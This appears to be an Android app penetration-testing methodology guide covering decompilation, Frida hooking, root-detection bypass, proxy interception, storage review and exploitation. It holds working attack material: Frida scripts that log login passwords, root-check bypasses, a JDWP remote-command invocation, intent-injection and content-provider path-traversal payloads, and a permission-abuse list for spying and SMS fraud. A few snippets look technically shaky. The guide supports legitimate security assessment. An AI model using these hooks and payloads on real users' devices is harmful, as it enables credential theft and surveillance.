# Mobile App Security Penetration Testing - Android
**Android-Specific Assessment & Exploitation** | Last Updated: 2026-03-20

---

## Overview

This guide covers Android-specific pentesting methodology. For shared setup, tools, and reporting, see **[Common Guide](mobile-app-security-common.md)**.

**Quick Links:**
- Storage Security (Section 5.1)
- Static Analysis (Section 2.1)
- Dynamic Analysis (Section 3)
- Android-Specific Vulns (Section 8.1)
- Exploitation (Section 10.1)

---

## Phase 0: Android Prerequisites & Setup

### 0.1 Android Testing Tools
**Objective:** Configure Android-specific tools

**Android Tools:**
- Android Studio (emulator)
- Android SDK & Platform Tools (adb)
- APKTool (decompilation)
- dex2jar (DEX to JAR conversion)
- CFR (Java decompiler)
- Frida (instrumentation)
- MobSF (vulnerability scanning)
- Logcat analyzer
- RootCloak (root detection bypass)
- Xposed Framework (framework hooks)

**Installation:**
```bash
# Android tools
brew install android-platform-tools
pip install frida-tools
pip install mobsf

# APKTool
brew install apktool

# dex2jar & CFR
brew install dex2jar
brew install cfr

# General
pip install requests paramiko
```

### 0.2 Android Emulator/Device Configuration
**Objective:** Set up test environment with disabled protections

**Create Android Emulator:**
```bash
# List available targets
android list targets

# Create emulator
android create avd --name test-avd --target android-30

# Launch with specific options
emulator -avd test-avd -no-snapshot -noaudio -no-window

# Or with more control
emulator -avd test-avd -writable-system -selinux disabled
```

**Physical Android Device:**
- Enable USB Debugging (Developer Options → USB Debugging)
- Install test app via APK
- Root device (optional but helpful)
  - Use Magisk for rooting
  - Provides module system for hooking
- Disable app signature verification (if possible)

**Verify Device Connection:**
```bash
adb devices
adb shell getprop ro.build.version.release
adb shell getprop ro.product.model
```

---

## Phase 2: Android Static Code Analysis

### 2.1 Android Decompilation
**Objective:** Convert APK to readable source code

**APK Structure:**
```
app.apk
├── AndroidManifest.xml (app configuration)
├── classes.dex (compiled Java bytecode)
├── resources.arsc (compiled resources)
├── lib/ (native libraries)
└── res/ (resources: strings, images, layouts)
```

**APK Decompilation Process:**

**Step 1: Extract APK**
```bash
unzip app.apk -d app-extracted
```

**Step 2: Convert DEX to JAR (Classes)**
```bash
# Using dex2jar
d2j-dex2jar app-extracted/classes.dex -o classes.jar

# Verify
unzip -l classes.jar | head -20
```

**Step 3: Decompile JAR to Java**
```bash
# Using CFR (best for modern Java)
cfr classes.jar --outputdir src/

# Or using other decompilers
# jd-cli classes.jar > source.java
# procyon classes.jar > source.java
```

**Step 4: View Decompiled Code**
```bash
ls -la src/
find src/ -name "*.java" | head -10
cat src/com/example/MainActivity.java
```

**Alternative: APKTool (for resources + smali)**
```bash
# Decompile entire APK (including resources)
apktool d app.apk -o app-decompiled

# View structure
ls -la app-decompiled/
cat app-decompiled/AndroidManifest.xml
cat app-decompiled/apktool.yml
```

**Smali Code (intermediate representation):**
```bash
# If you want to read Smali (closer to bytecode)
cat app-decompiled/smali/com/example/MainActivity.smali

# Smali format example:
.method protected onCreate(Landroid/os/Bundle;)V
  .registers 2
  invoke-super {p0, p1}, Landroid/app/Activity;->onCreate(Landroid/os/Bundle;)V
  const p1, 0x7f0c001f
  invoke-virtual {p0, p1}, Lcom/example/MainActivity;->setContentView(I)V
  return-void
.end method
```

### 2.2 AndroidManifest.xml Analysis
**Objective:** Identify app configuration, permissions, components

**Key Sections:**

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest
    xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.app"
    android:versionCode="1"
    android:versionName="1.0">

  <!-- Permissions requested -->
  <uses-permission android:name="android.permission.INTERNET" />
  <uses-permission android:name="android.permission.READ_CONTACTS" />
  <uses-permission android:name="android.permission.CAMERA" />
  
  <!-- Application configuration -->
  <application
      android:debuggable="true"  <!-- CRITICAL: Testing/Debug build? -->
      android:usesCleartextTraffic="true"  <!-- Allows HTTP -->
      ...>
      
    <!-- Activities (screens) -->
    <activity android:name=".MainActivity"
        android:exported="true">  <!-- Can be launched by other apps -->
      <intent-filter>
        <action android:name="android.intent.action.MAIN" />
        <category android:name="android.intent.category.LAUNCHER" />
      </intent-filter>
    </activity>
    
    <!-- Services (background) -->
    <service android:name=".AuthService"
        android:exported="true" />  <!-- Exploitable if unprotected -->
    
    <!-- Content Providers (data access) -->
    <provider
        android:name=".UserProvider"
        android:authorities="com.example.app.provider"
        android:exported="true" />  <!-- Can be queried by other apps -->
    
    <!-- Broadcast Receivers (listen for events) -->
    <receiver android:name=".SMSReceiver"
        android:exported="true">
      <intent-filter>
        <action android:name="android.provider.Telephony.SMS_RECEIVED" />
      </intent-filter>
    </receiver>
    
  </application>

</manifest>
```

**Analysis Checklist:**
- [ ] `android:debuggable="true"` → App is debuggable
- [ ] `android:usesCleartextTraffic="true"` → Allows unencrypted HTTP
- [ ] Exported components without `<permission>` → Exploitation target
- [ ] Dangerous permissions (CAMERA, RECORD_AUDIO, READ_CONTACTS, etc.)
- [ ] Intent filters that expose functionality
- [ ] Third-party libraries declared

**Quick Analysis:**
```bash
# Extract and view manifest
apktool d app.apk
cat app/AndroidManifest.xml | grep -E "exported|debuggable|permission|cleartext"

# Count permissions
grep 'uses-permission' app/AndroidManifest.xml | wc -l

# Find exported components
grep -E 'exported="true"' app/AndroidManifest.xml
```

### 2.3 Permission & Capability Analysis
**Objective:** Identify sensitive permissions requested

**Dangerous Permissions to Look For:**
```
Category: Location
  - android.permission.ACCESS_FINE_LOCATION
  - android.permission.ACCESS_COARSE_LOCATION

Category: Contacts
  - android.permission.READ_CONTACTS
  - android.permission.WRITE_CONTACTS

Category: Calendar
  - android.permission.READ_CALENDAR
  - android.permission.WRITE_CALENDAR

Category: SMS/Phone
  - android.permission.SEND_SMS
  - android.permission.READ_SMS
  - android.permission.READ_PHONE_STATE
  - android.permission.READ_PHONE_NUMBERS
  - android.permission.CALL_PHONE

Category: Sensors
  - android.permission.CAMERA
  - android.permission.RECORD_AUDIO

Category: Storage
  - android.permission.READ_EXTERNAL_STORAGE
  - android.permission.WRITE_EXTERNAL_STORAGE

Category: Account
  - android.permission.GET_ACCOUNTS
  - android.permission.USE_CREDENTIALS
```

**Check if permissions are properly gated:**
```bash
apktool d app.apk
grep -r "READ_CONTACTS\|CAMERA\|RECORD_AUDIO" app/smali/ | head -5
grep -r "ContextCompat.checkSelfPermission" app/smali/
# If no permission checks → permissions are likely not properly gated
```

### 2.4 Hardcoded Secrets & API Keys
**Objective:** Search for exposed credentials

```bash
apktool d app.apk

# Search for common patterns
grep -r "AKIA\|api_key\|secret\|password" app/smali/
grep -r "http://" app/smali/ | grep -v "https://"

# Search in string resources
grep -r "password\|secret\|key" app/res/values/*.xml

# Search in classes.dex directly
strings classes.dex | grep -E "^http://|api_key|password" | head -20
```

**Common patterns to search:**
```
- AWS Keys: AKIA followed by 16 alphanumeric
- API endpoints: http:// (unencrypted)
- Passwords in code: "password = "
- Tokens: "bearer ", "token"
- Secrets in config files
```

### 2.5 Insecure Coding Patterns (Android)
**Objective:** Identify common vulnerabilities in code

**Common Android Vulnerabilities:**

```
1. SQL Injection
   Pattern: db.rawQuery(String)
   Safe: Use parameterized queries with ?
   
2. Path Traversal
   Pattern: File("/sdcard/" + userInput)
   Safe: Validate and sanitize paths
   
3. Command Injection
   Pattern: Runtime.getRuntime().exec()
   Safe: Use ProcessBuilder with array args
   
4. Hardcoded Secrets
   Pattern: "password = " or "api_key = "
   Safe: Load from secure storage
   
5. Logging Sensitive Data
   Pattern: Log.d("TAG", password)
   Safe: Don't log PII in production
   
6. Insecure Deserialization
   Pattern: ObjectInputStream.readObject()
   Safe: Use JSON parsing with validation
   
7. Intent Injection
   Pattern: Unfiltered intent handling
   Safe: Validate intent sources
   
8. Content Provider Traversal
   Pattern: Unvalidated path concatenation
   Safe: Validate and whitelist paths
```

**Search for Patterns:**
```bash
# SQL Injection
grep -r "rawQuery\|execSQL" app/smali/

# Command Injection
grep -r "Runtime.getRuntime\|ProcessBuilder" app/smali/

# Logging secrets
grep -r "Log\.d\|Log\.e" app/smali/ | grep -i "password\|token\|secret"

# Hardcoded strings
strings classes.dex | grep -E "password|key|secret|bearer|auth" | head -20

# Insecure deserialization
grep -r "ObjectInputStream\|readObject\|readExternal" app/smali/
```

**Example Vulnerable Code:**
```java
// VULNERABLE: SQL Injection
String query = "SELECT * FROM users WHERE id=" + userInput;
db.rawQuery(query, null);

// SAFE: Parameterized
db.rawQuery("SELECT * FROM users WHERE id=?", new String[]{userInput});

// VULNERABLE: Path Traversal
File file = new File("/sdcard/" + userPath);
file.read();

// SAFE: Validate path
File base = new File("/sdcard/app-data");
File file = new File(base, sanitize(userPath));  // Validates within base
```

---

## Phase 3: Android Dynamic Analysis & Runtime Testing

### 3.1 Frida Instrumentation Setup
**Objective:** Hook and modify app at runtime

**Install Frida Server on Device:**
```bash
# Download Frida server for your Android version
# From: https://github.com/frida/frida/releases

# Assuming ARM64 architecture:
wget https://github.com/frida/frida/releases/download/14.2.2/frida-server-14.2.2-android-arm64.xz
xz -d frida-server-14.2.2-android-arm64.xz

# Push to device
adb push frida-server-14.2.2-android-arm64 /data/local/tmp/frida-server
adb shell chmod +x /data/local/tmp/frida-server

# Start Frida server
adb shell /data/local/tmp/frida-server &

# Verify connection
frida-ps -U
frida-ps -U -a  # All processes
```

### 3.2 Frida Hooking & Method Interception
**Objective:** Intercept and modify function calls at runtime

**Common Android Targets:**

**Hook SharedPreferences (Credential Storage):**
```javascript
Java.perform(function() {
  var SharedPreferences = Java.use("android.content.SharedPreferences");
  var getString = SharedPreferences.getString.overload("java.lang.String", "java.lang.String");
  
  getString.implementation = function(key, defaultValue) {
    var result = this.getString(key, defaultValue);
    console.log("[SharedPreferences] Key: " + key + " = " + result);
    return result;
  };
});
```

**Hook SQLite Queries:**
```javascript
Java.perform(function() {
  var SQLiteDatabase = Java.use("android.database.sqlite.SQLiteDatabase");
  var rawQuery = SQLiteDatabase.rawQuery.overload("java.lang.String", "[Ljava/lang/String;");
  
  rawQuery.implementation = function(sql, args) {
    console.log("[SQL] " + sql);
    if (args != null) {
      for (var i = 0; i < args.length; i++) {
        console.log("  [arg" + i + "] " + args[i]);
      }
    }
    return this.rawQuery(sql, args);
  };
});
```

**Hook HTTP Headers (HttpURLConnection):**
```javascript
Java.perform(function() {
  var HttpURLConnection = Java.use("java.net.HttpURLConnection");
  var setRequestProperty = HttpURLConnection.setRequestProperty.overload("java.lang.String", "java.lang.String");
  
  setRequestProperty.implementation = function(key, value) {
    console.log("[Header] " + key + ": " + value);
    return this.setRequestProperty(key, value);
  };
});
```

**Hook OkHttp Requests (modern apps):**
```javascript
Java.perform(function() {
  var Request = Java.use("okhttp3.Request");
  
  Request.$init.overload("okhttp3.Request$Builder").implementation = function(builder) {
    console.log("[OkHttp] Request created");
    return this.$init(builder);
  };
});
```

**Hook Authentication/Login:**
```javascript
Java.perform(function() {
  var LoginActivity = Java.use("com.example.app.LoginActivity");
  
  LoginActivity.authenticate.overload("java.lang.String", "java.lang.String").implementation = function(username, password) {
    console.log("[Auth] Username: " + username);
    console.log("[Auth] Password: " + password);
    return this.authenticate(username, password);
  };
});
```

**Running Hooks:**
```bash
# Save your hook to file
cat > hook.js << 'EOF'
Java.perform(function() {
  var LoginActivity = Java.use("com.example.app.LoginActivity");
  LoginActivity.authenticate.overload("java.lang.String", "java.lang.String").implementation = function(username, password) {
    console.log("[Auth] " + username + " : " + password);
    return this.authenticate(username, password);
  };
});
EOF

# Spawn and hook app
frida -U -f com.example.app -l hook.js --no-pause

# Or attach to running app
frida -U com.example.app -l hook.js

# Interact with hooked app in console
```

### 3.3 Bypassing Root Detection
**Objective:** Disable anti-tampering mechanisms

**Android Root Detection Bypass:**

**Method 1: Hook Detection Method Directly**
```javascript
Java.perform(function() {
  var RootDetection = Java.use("com.example.security.RootDetection");
  
  if (RootDetection.isDeviceRooted) {
    RootDetection.isDeviceRooted.implementation = function() {
      console.log("[+] isDeviceRooted called - returning false");
      return false;
    };
  }
});
```

**Method 2: Hook su Command Execution**
```javascript
Java.perform(function() {
  var Runtime = Java.use("java.lang.Runtime");
  var exec = Runtime.exec.overload("java.lang.String");
  
  exec.implementation = function(cmd) {
    if (cmd.includes("su") || cmd.includes("which su")) {
      console.log("[+] Blocking root check: " + cmd);
      throw new Error("Command blocked");
    }
    return this.exec(cmd);
  };
});
```

**Method 3: Mock Build Properties**
```javascript
Java.perform(function() {
  var Build = Java.use("android.os.Build");
  
  // Mock as release build (not debug/test)
  Build.TAGS.value = "release-keys";  // Instead of "test-keys"
  Build.FINGERPRINT.value = "generic_x86/sdk_google_x86/generic_x86:8.0/OSR1/5020638:user/release-keys";
});
```

**Method 4: Hook File Access (Cydia, Xposed, etc.)**
```javascript
var libc = Module.findExportByName(null, "access");
Interceptor.replace(libc, new NativeCallback(function(path) {
  var pathStr = Memory.readCString(path);
  
  // Block access to root tools
  if (pathStr.includes("/system/app/Cydia") ||
      pathStr.includes("/system/xposed") ||
      pathStr.includes("/data/data/de.robv.android.xposed")) {
    console.log("[+] Blocking path: " + pathStr);
    return -1;  // Return error
  }
  
  return 0;
}, 'int', ['pointer']));
```

**Using Frida Gadget (alternative):**
```bash
# Inject Frida Gadget into app for persistent hooking
# More complex but survives app restarts
```

### 3.4 Debugger Attachment & Code Execution
**Objective:** Attach debugger for step-by-step analysis

**Enable Debugging in APK:**
```bash
# Edit AndroidManifest.xml
apktool d app.apk
nano app/AndroidManifest.xml
# Change: android:debuggable="false" to "true"

# Rebuild APK
apktool b app -o app-debuggable.apk

# Sign APK
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore debug.keystore app-debuggable.apk androiddebugkey

# Install
adb install -r app-debuggable.apk
```

**Attach Android Studio Debugger:**
```bash
# Forward port
adb forward tcp:5005 tcp:5005

# Open project in Android Studio
# Run → Attach Debugger to Android Process
# Select your app process
# Set breakpoints and debug
```

**JDWP RCE (Java Debug Wire Protocol):**
```bash
# If JDWP is exposed, get remote code execution
pip install jdwp-shellifier
python jdwp-shellifier.py --host localhost --port 5005 --cmd "shell command"

# Or use:
python -c "
import socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('localhost', 5005))
# Send JDWP protocol commands...
"
```

---

## Phase 4: Network Traffic Analysis (Android)

### 4.1 Burp Suite Proxy Setup (Android)
**Objective:** Intercept HTTPS/HTTP traffic

**Step 1: Configure Proxy on Device**
```bash
# Option A: Via adb (programmatic)
adb shell settings put global http_proxy <burp-ip>:<port>
# e.g., adb shell settings put global http_proxy 192.168.1.50:8080

# Verify
adb shell settings get global http_proxy

# Clear proxy
adb shell settings put global http_proxy :0
```

**Option B: Manual WiFi Proxy**
```
Device Settings:
1. WiFi → Long-press connected network
2. Modify network
3. Advanced options
4. Proxy: Manual
5. Proxy hostname: <burp-ip>
6. Proxy port: 8080
7. Save
```

**Step 2: Install Burp CA Certificate**
```bash
# Export certificate from Burp
# Burp → Preferences → Network → SSL → Export CA certificate

# Convert to PEM format (if needed)
openssl x509 -inform DER -in cacert.der -out cacert.pem

# Push to device
adb push cacert.pem /sdcard/Download/

# Install via device Settings
# Settings → Security → Install from storage → Select certificate

# Verify installation
adb shell ls -la /system/etc/security/cacerts/
```

**Step 3: Verify Traffic**
```bash
# Open app and navigate
# Check Burp for intercepted traffic

# Use Logcat to verify app is using proxy
adb logcat | grep -i "proxy\|http"
```

**Optional: Use iptables for Transparent Proxy**
```bash
# More advanced - redirect all traffic through Burp
adb shell iptables -t nat -A OUTPUT -p tcp --dport 80 -j DNAT --to-destination <burp-ip>:8080
adb shell iptables -t nat -A OUTPUT -p tcp --dport 443 -j DNAT --to-destination <burp-ip>:8443
```

---

## Phase 5: Android Storage Security

### 5.1 Android Local Storage Assessment
**Objective:** Identify insecure data storage

**SharedPreferences (Key-Value Storage):**
```bash
# Locate SharedPreferences files
adb shell find /data/data/com.example.app -name "*.xml"

# Typical location:
# /data/data/com.example.app/shared_prefs/preferences.xml

# Pull files
adb pull /data/data/com.example.app/shared_prefs/

# View (XML format)
cat shared_prefs/preferences.xml
```

**Example Vulnerable SharedPreferences:**
```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
  <string name="username">john_doe</string>
  <string name="password">SecurePass123!</string>
  <string name="api_token">Bearer eyJhbGc...</string>
  <string name="user_email">john@example.com</string>
</map>
```

**SQLite Databases:**
```bash
# Locate databases
adb shell find /data/data/com.example.app -name "*.db"

# Typical location:
# /data/data/com.example.app/databases/app.db

# Pull database
adb pull /data/data/com.example.app/databases/app.db

# Query (requires sqlite3 on host)
sqlite3 app.db

# Common commands
sqlite3 app.db ".tables"
sqlite3 app.db ".schema users"
sqlite3 app.db "SELECT * FROM users;"
sqlite3 app.db "SELECT password, username FROM credentials;"
```

**Example Vulnerable Database:**
```sql
-- Users table
CREATE TABLE users (
  id INTEGER PRIMARY KEY,
  username TEXT,
  email TEXT,
  password TEXT,  -- VULNERABLE: plaintext password
  auth_token TEXT  -- VULNERABLE: no encryption
);

INSERT INTO users VALUES (1, 'admin', 'admin@app.com', 'AdminPass123!', 'eyJhbGc...');
```

**File Storage (App Data Directory):**
```bash
# Check app directory permissions
adb shell ls -la /data/data/com.example.app/

# Check external storage
adb shell ls -la /sdcard/Android/data/com.example.app/

# Pull all app data
adb pull /data/data/com.example.app/ ./extracted-app-data/

# Analyze files
find extracted-app-data -type f | xargs file
strings extracted-app-data/files/* | grep -i password
find extracted-app-data -name "*.key" -o -name "*.pem"  # Crypto keys
```

**External Storage (World-Readable):**
```bash
# Check /sdcard for world-readable files
adb shell ls -la /sdcard/
adb shell ls -la /sdcard/DCIM/  # Photos
adb shell ls -la /sdcard/Android/data/com.example.app/

# Pull suspicious files
adb pull /sdcard/Android/data/com.example.app/files/ ./
```

---

## Phase 7: Android Cryptography Assessment

### 7.1 Cryptographic Implementation Review
**Objective:** Identify weak cryptography

**Common Android Weaknesses:**
```
1. DES / 3DES - Too weak
2. MD5, SHA1 - Collision vulnerabilities
3. RC4 - Biased keystream
4. ECB mode - Deterministic (reveals patterns)
5. Random() - Not cryptographically secure
6. Hardcoded encryption keys
```

**Search for Patterns:**
```bash
apktool d app.apk

# Search for weak algorithms
grep -r "DES\|TripleDES" app/smali/
grep -r "MD5\|SHA1\|MD4" app/smali/
grep -r "RC4\|ARCFOUR" app/smali/
grep -r "ECB" app/smali/
grep -r "java.util.Random\|new Random(" app/smali/ | grep -v SecureRandom

# Search for crypto imports
grep -r "javax.crypto\|java.security" app/smali/ | head -10

# Strings search
strings classes.dex | grep -i "cipher\|encrypt\|decrypt\|key"
```

**Vulnerable Examples:**
```java
// VULNERABLE: DES (weak algorithm)
Cipher cipher = Cipher.getInstance("DES");

// VULNERABLE: ECB mode (deterministic)
Cipher cipher = Cipher.getInstance("AES/ECB/PKCS5Padding");

// VULNERABLE: Weak random
Random random = new Random();  // NOT cryptographically secure
byte[] key = new byte[16];
random.nextBytes(key);

// VULNERABLE: Hardcoded key
SecretKey key = new SecretKeySpec("12345678".getBytes(), 0, 8, "DES");

// SAFE: Strong encryption
SecureRandom random = new SecureRandom();
KeyGenerator keyGen = KeyGenerator.getInstance("AES");
keyGen.init(256, random);
SecretKey key = keyGen.generateKey();
```

### 7.2 Key Management Testing (Android)
**Objective:** Verify secure key storage

**Android Keystore Analysis:**
```bash
# Check if using Android Keystore
apktool d app.apk
grep -r "KeyStore\|KeyProperties\|KeyGenerator" app/smali/
grep -r "AndroidKeyStore" app/smali/

# Vulnerable: Keys in SharedPreferences or hardcoded
grep -r "key\|secret" app/res/values/*.xml
strings classes.dex | grep -E "^[A-Za-z0-9/+]{20,}" | grep "="  # Base64-encoded keys
```

**Hardcoded Key Search:**
```bash
# Search for patterns that look like encoded keys
strings classes.dex | grep -E "AAAAgIAAA|-----BEGIN|MIIBIjANBgkqhkiG"

# Check native libraries for keys
adb pull /data/app/com.example.app/lib/
strings lib/*.so | grep -i "key\|secret\|password"
```

---

## Phase 8: Android-Specific Vulnerabilities

### 8.1 Android-Specific Issues
**Objective:** Test Android-specific attack vectors

**Intent Injection (Exported Components):**
```bash
# Identify exported components
apktool d app.apk
grep -E 'exported="true"' app/AndroidManifest.xml

# Exploit via adb
adb shell am start -a com.example.app.LAUNCH_UNPROTECTED -n com.example.app/.UnprotectedActivity

# Send data to exported activity
adb shell am start -a com.example.app.SENSITIVE_ACTION --es data "malicious_payload"

# Broadcast to vulnerable receiver
adb shell am broadcast -a com.example.app.MALICIOUS_ACTION --es token "stolen_token"
```

**Example Exploitation:**
```
# If app has vulnerable Intent Filter:
<activity android:name=".AdminPanel" android:exported="true">
  <intent-filter>
    <action android:name="com.example.app.ADMIN" />
  </intent-filter>
</activity>

# Exploit:
adb shell am start -a com.example.app.ADMIN -n com.example.app/.AdminPanel
# Directly launches admin panel without authentication
```

**Content Provider Exploitation:**
```bash
# Enumerate content providers
apktool d app.apk
grep -r "content://" app/AndroidManifest.xml

# Query content provider
adb shell content query --uri content://com.example.app.provider/users

# Request specific columns
adb shell content query --uri content://com.example.app.provider/users --projection id,name,email

# Exploit path traversal
adb shell content query --uri "content://com.example.app.provider/../../etc/passwd"

# Write data (if vulnerable)
adb shell content insert --uri content://com.example.app.provider/users --bind name:s:admin --bind password:s:hacked
```

**Broadcast Receiver Abuse:**
```bash
# Identify receivers
apktool d app.apk
grep -r "BroadcastReceiver" app/AndroidManifest.xml

# Send broadcast
adb shell am broadcast -a com.example.app.SENSITIVE_ACTION --es data "malicious"

# Receiver with intent-filter may process any app's broadcast
# Example: SMS_RECEIVED receiver may be tricked into processing fake SMS
```

---

## Phase 9: Android Data Exfiltration

### 9.1 Android Data Extraction
**Objective:** Extract and analyze app data

**Full App Data Pull:**
```bash
# Complete app directory
adb pull /data/data/com.example.app/ ./extracted-data/

# Analyze structure
ls -la extracted-data/
tree extracted-data/ | head -30
```

**Database Dump:**
```bash
# List databases
adb shell ls /data/data/com.example.app/databases/

# SQLite dump
adb shell sqlite3 /data/data/com.example.app/databases/app.db ".dump" > full-database.sql

# Query specific table
adb shell sqlite3 /data/data/com.example.app/databases/app.db "SELECT * FROM users;" > users.csv
```

**SharedPreferences Dump:**
```bash
# Pull preference files
adb pull /data/data/com.example.app/shared_prefs/ ./prefs/

# Analyze
for f in prefs/*.xml; do
  echo "=== $f ==="
  cat "$f" | xmllint --format -
done
```

**Logcat Logs:**
```bash
# Real-time logs
adb logcat

# Filter by app
adb logcat --pid=$(adb shell pidof com.example.app)

# Save logs
adb logcat > app.log

# Search for secrets
adb logcat | grep -i "password\|token\|api\|secret"
```

**Media & Files:**
```bash
# DCIM (Camera photos)
adb pull /sdcard/DCIM/ ./dcim-data/

# App-specific external storage
adb pull /sdcard/Android/data/com.example.app/ ./app-external-data/

# Downloads
adb pull /sdcard/Download/ ./downloads/
```

### 9.2 Android Memory Forensics
**Objective:** Extract sensitive data from memory

**Memory Dumping:**
```bash
# Get process ID
adb shell pidof com.example.app

# Dump memory maps
adb shell cat /proc/[pid]/maps > memory-maps.txt

# Dump heap
adb shell am dumpheap com.example.app /data/local/tmp/heap.dump

# Pull heap dump
adb pull /data/local/tmp/heap.dump

# Convert to standard format (HPROF)
hprof-conv heap.dump heap.hprof

# Analyze with Java tools
jhat -J-Xmx2g heap.hprof
```

**Search for Secrets in Memory:**
```bash
# Strings from memory
adb shell cat /proc/[pid]/fd/3 | strings | grep -i "password\|token"

# Or use Frida to inspect memory
// Use Frida to search memory for patterns
Interceptor.attach(Module.findExportByName(null, "strlen"), {
  onLeave: function(retval) {
    var ptr = this.context.rdi;
    var str = Memory.readCString(ptr);
    if (str.includes("password") || str.includes("token")) {
      console.log("[Memory] Found: " + str);
    }
  }
});
```

### 9.3 Android Log Analysis
**Objective:** Extract sensitive data from logs

**Logcat Analysis:**
```bash
# View all logs
adb logcat

# Filter by app
adb logcat com.example.app:*

# Filter by level
adb logcat *:E  # Error level only
adb logcat *:W  # Warning and above

# Save and analyze
adb logcat > full-logcat.log
grep -i "password\|credential\|secret\|key\|token" full-logcat.log

# Real-time grep
adb logcat | grep -E "password|credential|secret"
```

**Sensitive Patterns:**
```bash
# Common leaks
grep -i "password\|passwd\|pwd" full-logcat.log
grep -i "token\|bearer\|auth" full-logcat.log
grep -i "api.key\|apikey\|secret_key" full-logcat.log
grep -i "credit.card\|cvv\|ssn" full-logcat.log
grep -E "https://.*password=|bearer [A-Za-z0-9]+" full-logcat.log
```

---

## Phase 10: Android Exploitation & Privilege Escalation

### 10.1 Android Privilege Escalation
**Objective:** Escalate privileges

**Dangerous Permission Exploitation:**

```
WRITE_EXTERNAL_STORAGE
→ Write arbitrary files to /sdcard/
→ Write backdoor APK
→ Trick user into installing malware

READ_CONTACTS
→ Steal all contacts + phone numbers
→ Data exfiltration

READ_CALENDAR
→ Steal calendar events
→ Learn user's schedule/habits

RECORD_AUDIO
→ Monitor conversations
→ Spy on user

ACCESS_FINE_LOCATION
→ Track user's real-time location
→ Location history

CAMERA
→ Record video/photos
→ Spy on user

SEND_SMS
→ Send SMS from user's device
→ Send premium SMS (steal money)

READ_SMS
→ Intercept SMS codes
→ Bypass 2FA

CALL_PHONE
→ Make calls from user's device
→ Premium call charges
```

**Exploitation via Intent Injection:**

```java
// Create backdoor app that requests dangerous permissions
// Install via:
adb install backdoor.apk

// Or exploit vulnerable exported component:
adb shell am start -a com.example.app.ADMIN -n com.example.app/.AdminPanel

// Now you have admin access without authentication
```

**Exploit Via Content Provider Path Traversal:**

```bash
# If content provider doesn't validate paths:
adb shell content query --uri "content://com.example.app/..\\..\\..\\..\\etc\\passwd"

# Or
adb shell content query --uri "content://com.example.app/%2e%2e%2fetc%2fpasswd"
```

---

## Tools & References

### Decompilation & Analysis
- **APKTool** - APK decompilation
- **dex2jar** - DEX to JAR conversion
- **CFR** - Java decompiler
- **Frida** - Runtime instrumentation
- **MobSF** - Mobile security scanning

### Interception & Debugging
- **Burp Suite** - Proxy & intercept
- **Android Studio** - Debugger
- **Logcat** - System logs
- **Wireshark** - Network analysis

### Exploitation
- **Metasploit** - Android modules
- **Shodan** - Device search
- **APKLab** - VSCode APK analysis

---

**Last Updated:** 2026-03-20
**Version:** 2.0 (split into common + platform-specific)
